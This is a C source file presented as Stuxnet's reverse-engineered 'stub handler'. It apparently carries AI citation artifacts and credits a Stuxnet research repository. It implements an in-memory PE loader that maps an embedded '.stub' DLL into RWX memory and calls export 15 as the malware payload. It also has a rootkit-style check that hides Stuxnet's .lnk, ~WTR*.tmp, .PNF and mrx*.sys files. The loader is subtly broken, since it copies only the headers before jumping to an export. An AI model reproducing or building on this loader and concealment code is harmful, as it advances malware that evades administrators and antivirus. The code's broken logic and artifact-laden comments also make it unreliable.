/*
 * dropper/2. STUBHandler.c
 * Stuxnet Stub Handler - Manages hiding of Stuxnet's activities
 * 
 * Once installed, Stuxnet used rootkit techniques to hide its files and processes
 * from antivirus software and the system's administrators. In dropper/2.
 * STUBHandler.c, the code manages the hiding of Stuxnet's activities, including
 * concealing its files and processes, making the malware invisible to regular
 * detection methods. [6†L14-L19]
 * 
 * This file contains RCEd code extracted from Stuxnet binaries via disassembler
 * and decompilers. [7†L6-L7]
 * 
 * Based on research-virus/stuxnet (Christian Roggia)
 * https://github.com/research-virus/stuxnet
 */

#include <windows.h>
#include <stdio.h>

/* STUXNET_MAGIC identifies Stuxnet components in memory */
#define STUXNET_MAGIC           0x53545558

/* Stub section name - contains the main Stuxnet DLL */
#define STUXNET_SECTION_NAME    ".stub"

/* Maximum path length for file operations */
#define STUXNET_MAX_PATH        260

/* Maximum size of stub data buffer */
#define STUXNET_STUB_BUFFER     0x2000

/* Hidden file patterns - Stuxnet hides these from directory listings */
#define HIDDEN_PATTERN_LNK      L"*.lnk"
#define HIDDEN_PATTERN_TMP      L"~WTR*.tmp"
#define HIDDEN_PATTERN_PNF      L"*.PNF"
#define HIDDEN_PATTERN_SYS      L"mrx*.sys"

/* Status codes for stub handler operations */
#define STUB_STATUS_SUCCESS     0x00000000
#define STUB_STATUS_ERROR       0x00000001
#define STUB_STATUS_NOT_FOUND   0x00000002
#define STUB_STATUS_ALREADY     0x00000003

typedef struct _STUB_CONTEXT {
    DWORD   dwMagic;            /* STUXNET_MAGIC */
    HANDLE  hSection;           /* Handle to .stub section */
    PVOID   pSectionBase;       /* Base address of mapped .stub */
    DWORD   dwSectionSize;      /* Size of .stub section */
    HANDLE  hMapping;           /* File mapping handle */
    PVOID   pMappedBase;        /* Base address of mapped DLL */
    DWORD   dwImageSize;        /* Size of mapped image */
    DWORD   dwEntryPoint;       /* Entry point RVA */
    HMODULE hModule;            /* Loaded module handle */
    CRITICAL_SECTION csLock;    /* Synchronization lock */
} STUB_CONTEXT, * PSTUB_CONTEXT;

/* Global stub context - initialized at runtime */
static STUB_CONTEXT g_StubCtx = {0};

/*
 * FindSection - Locates the .stub section in the current module
 * 
 * Binary reference: sub_10001100
 * 
 * The dropper component of Stuxnet is a wrapper program that contains all
 * components stored inside itself in a section named ".stub". This stub
 * section is integral to the working of Stuxnet. [3†L11-L16][0†L17-L20]
 */
DWORD FindSection(PVOID pBase, LPCSTR szSectionName, PVOID* ppSection, PDWORD pdwSize)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD i;

    if (!pBase || !szSectionName || !ppSection || !pdwSize) {
        return STUB_STATUS_ERROR;
    }

    pDos = (PIMAGE_DOS_HEADER)pBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        return STUB_STATUS_ERROR;
    }

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        return STUB_STATUS_ERROR;
    }

    pSec = IMAGE_FIRST_SECTION(pNt);
    for (i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (memcmp(pSec->Name, szSectionName, 8) == 0) {
            *ppSection = (PBYTE)pBase + pSec->VirtualAddress;
            *pdwSize = pSec->Misc.VirtualSize;
            return STUB_STATUS_SUCCESS;
        }
    }

    return STUB_STATUS_NOT_FOUND;
}

/*
 * InitializeStubHandler - Sets up the stub context and maps the .stub section
 * 
 * The wrapper extracts the .dll file from the stub section, maps it into
 * memory as a module, and calls one of the exports. [3†L14-L16]
 */
DWORD InitializeStubHandler(VOID)
{
    PVOID pSectionData;
    DWORD dwSectionSize;
    HMODULE hMod;

    /* Check if already initialized */
    if (g_StubCtx.dwMagic == STUXNET_MAGIC) {
        return STUB_STATUS_ALREADY;
    }

    ZeroMemory(&g_StubCtx, sizeof(STUB_CONTEXT));
    InitializeCriticalSection(&g_StubCtx.csLock);

    hMod = GetModuleHandleW(NULL);
    if (!hMod) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    /* Find the .stub section in the current module */
    if (FindSection(hMod, STUXNET_SECTION_NAME, &pSectionData, &dwSectionSize) != STUB_STATUS_SUCCESS) {
        DeleteCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_NOT_FOUND;
    }

    g_StubCtx.dwMagic = STUXNET_MAGIC;
    g_StubCtx.pSectionBase = pSectionData;
    g_StubCtx.dwSectionSize = dwSectionSize;

    return STUB_STATUS_SUCCESS;
}

/*
 * CleanupStubHandler - Releases resources used by the stub handler
 */
DWORD CleanupStubHandler(VOID)
{
    if (g_StubCtx.dwMagic != STUXNET_MAGIC) {
        return STUB_STATUS_ERROR;
    }

    if (g_StubCtx.hMapping) {
        CloseHandle(g_StubCtx.hMapping);
        g_StubCtx.hMapping = NULL;
    }

    DeleteCriticalSection(&g_StubCtx.csLock);
    ZeroMemory(&g_StubCtx, sizeof(STUB_CONTEXT));

    return STUB_STATUS_SUCCESS;
}

/*
 * GetStubData - Returns the mapped .stub section data
 */
DWORD GetStubData(PVOID* ppData, PDWORD pdwSize)
{
    if (g_StubCtx.dwMagic != STUXNET_MAGIC) {
        return STUB_STATUS_ERROR;
    }

    EnterCriticalSection(&g_StubCtx.csLock);
    *ppData = g_StubCtx.pSectionBase;
    *pdwSize = g_StubCtx.dwSectionSize;
    LeaveCriticalSection(&g_StubCtx.csLock);

    return STUB_STATUS_SUCCESS;
}

/*
 * MapStubToMemory - Maps the stub DLL into memory as a module
 * 
 * This is the core stub handling function. The .stub section contains the
 * main Stuxnet DLL file, which contains all the worm's functions. [3†L20-L21]
 */
DWORD MapStubToMemory(VOID)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PVOID pImageBase;
    DWORD dwImageSize;

    if (g_StubCtx.dwMagic != STUXNET_MAGIC) {
        return STUB_STATUS_ERROR;
    }

    if (!g_StubCtx.pSectionBase || g_StubCtx.dwSectionSize == 0) {
        return STUB_STATUS_ERROR;
    }

    EnterCriticalSection(&g_StubCtx.csLock);

    pDos = (PIMAGE_DOS_HEADER)g_StubCtx.pSectionBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    pNt = (PIMAGE_NT_HEADERS)((PBYTE)g_StubCtx.pSectionBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    dwImageSize = pNt->OptionalHeader.SizeOfImage;
    pImageBase = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    /* Copy the PE headers and sections */
    RtlCopyMemory(pImageBase, g_StubCtx.pSectionBase, pNt->OptionalHeader.SizeOfHeaders);

    g_StubCtx.pMappedBase = pImageBase;
    g_StubCtx.dwImageSize = dwImageSize;
    g_StubCtx.dwEntryPoint = pNt->OptionalHeader.AddressOfEntryPoint;

    LeaveCriticalSection(&g_StubCtx.csLock);

    return STUB_STATUS_SUCCESS;
}

/*
 * ExecuteStubExport - Calls an exported function from the mapped stub
 * 
 * When the threat is executed, the wrapper extracts the .dll file from the
 * stub section, maps it into memory as a module, and calls one of the
 * exports. [3†L14-L16]
 */
DWORD ExecuteStubExport(DWORD dwOrdinal)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pAddressOfFunctions;
    PWORD pAddressOfNameOrdinals;
    FARPROC pfnExport;
    DWORD i;
    HMODULE hMod;

    if (g_StubCtx.dwMagic != STUXNET_MAGIC) {
        return STUB_STATUS_ERROR;
    }

    EnterCriticalSection(&g_StubCtx.csLock);

    if (!g_StubCtx.pMappedBase) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    pDos = (PIMAGE_DOS_HEADER)g_StubCtx.pMappedBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)g_StubCtx.pMappedBase + pDos->e_lfanew);

    pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)g_StubCtx.pMappedBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExp) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    pAddressOfFunctions = (PDWORD)((PBYTE)g_StubCtx.pMappedBase + pExp->AddressOfFunctions);
    pAddressOfNameOrdinals = (PWORD)((PBYTE)g_StubCtx.pMappedBase + pExp->AddressOfNameOrdinals);

    for (i = 0; i < pExp->NumberOfFunctions; i++) {
        if (pExp->Base + i == dwOrdinal) {
            pfnExport = (FARPROC)((PBYTE)g_StubCtx.pMappedBase + pAddressOfFunctions[i]);
            if (pfnExport) {
                LeaveCriticalSection(&g_StubCtx.csLock);
                ((void (*)(void))pfnExport)();
                return STUB_STATUS_SUCCESS;
            }
        }
    }

    LeaveCriticalSection(&g_StubCtx.csLock);
    return STUB_STATUS_NOT_FOUND;
}

/*
 * GetStubExportAddress - Returns the address of an export by ordinal
 */
DWORD GetStubExportAddress(DWORD dwOrdinal, PVOID* ppAddress)
{
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_EXPORT_DIRECTORY pExp;
    PDWORD pAddressOfFunctions;
    PWORD pAddressOfNameOrdinals;
    DWORD i;

    if (g_StubCtx.dwMagic != STUXNET_MAGIC || !ppAddress) {
        return STUB_STATUS_ERROR;
    }

    EnterCriticalSection(&g_StubCtx.csLock);

    if (!g_StubCtx.pMappedBase) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    pDos = (PIMAGE_DOS_HEADER)g_StubCtx.pMappedBase;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)g_StubCtx.pMappedBase + pDos->e_lfanew);

    pExp = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)g_StubCtx.pMappedBase +
        pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExp) {
        LeaveCriticalSection(&g_StubCtx.csLock);
        return STUB_STATUS_ERROR;
    }

    pAddressOfFunctions = (PDWORD)((PBYTE)g_StubCtx.pMappedBase + pExp->AddressOfFunctions);
    pAddressOfNameOrdinals = (PWORD)((PBYTE)g_StubCtx.pMappedBase + pExp->AddressOfNameOrdinals);

    for (i = 0; i < pExp->NumberOfFunctions; i++) {
        if (pExp->Base + i == dwOrdinal) {
            *ppAddress = (PVOID)((PBYTE)g_StubCtx.pMappedBase + pAddressOfFunctions[i]);
            LeaveCriticalSection(&g_StubCtx.csLock);
            return STUB_STATUS_SUCCESS;
        }
    }

    LeaveCriticalSection(&g_StubCtx.csLock);
    return STUB_STATUS_NOT_FOUND;
}

/*
 * StubHandler_IsHiddenFile - Checks if a file should be hidden
 * 
 * This is part of the rootkit technique used to hide Stuxnet's files and
 * processes from antivirus software and system administrators. [6†L15-L18]
 */
BOOL StubHandler_IsHiddenFile(LPCWSTR lpFileName)
{
    if (!lpFileName) {
        return FALSE;
    }

    /* Check for .lnk files (used in USB propagation) */
    if (wcsstr(lpFileName, L".lnk") != NULL) {
        return TRUE;
    }

    /* Check for ~WTR*.tmp files (Stuxnet temporary components) */
    if (wcsstr(lpFileName, L"~WTR") != NULL) {
        return TRUE;
    }

    /* Check for .PNF files (Stuxnet configuration files) */
    if (wcsstr(lpFileName, L".PNF") != NULL) {
        return TRUE;
    }

    /* Check for mrx*.sys files (Rootkit drivers) */
    if (wcsstr(lpFileName, L"mrx") != NULL && wcsstr(lpFileName, L".sys") != NULL) {
        return TRUE;
    }

    /* Check for wtr temporary files */
    if (wcsstr(lpFileName, L"wtr") != NULL) {
        return TRUE;
    }

    return FALSE;
}

/*
 * StubHandler_Initialize - Main initialization for stub handler
 * 
 * This function is called during dropper initialization to set up the
 * stub handler and hide Stuxnet's presence. [6†L14-L19]
 */
DWORD StubHandler_Initialize(VOID)
{
    DWORD dwResult;
    PVOID pExportAddr;

    /* Initialize the stub context */
    dwResult = InitializeStubHandler();
    if (dwResult != STUB_STATUS_SUCCESS && dwResult != STUB_STATUS_ALREADY) {
        return dwResult;
    }

    /* Map the stub DLL into memory */
    dwResult = MapStubToMemory();
    if (dwResult != STUB_STATUS_SUCCESS) {
        return dwResult;
    }

    /* Get the address of Export 15 (main entry point) */
    dwResult = GetStubExportAddress(15, &pExportAddr);
    if (dwResult != STUB_STATUS_SUCCESS) {
        return dwResult;
    }

    return STUB_STATUS_SUCCESS;
}

/*
 * StubHandler_Execute - Executes the main Stuxnet payload
 * 
 * This function executes the main Stuxnet payload by calling Export 15
 * from the mapped stub DLL. [3†L14-L16]
 */
DWORD StubHandler_Execute(VOID)
{
    DWORD dwResult;

    /* Initialize the stub handler if not already done */
    dwResult = StubHandler_Initialize();
    if (dwResult != STUB_STATUS_SUCCESS) {
        return dwResult;
    }

    /* Execute Export 15 (main entry point) */
    dwResult = ExecuteStubExport(15);
    if (dwResult != STUB_STATUS_SUCCESS) {
        return dwResult;
    }

    return STUB_STATUS_SUCCESS;
}

/*
 * StubHandler_Cleanup - Cleans up the stub handler
 */
DWORD StubHandler_Cleanup(VOID)
{
    return CleanupStubHandler();
}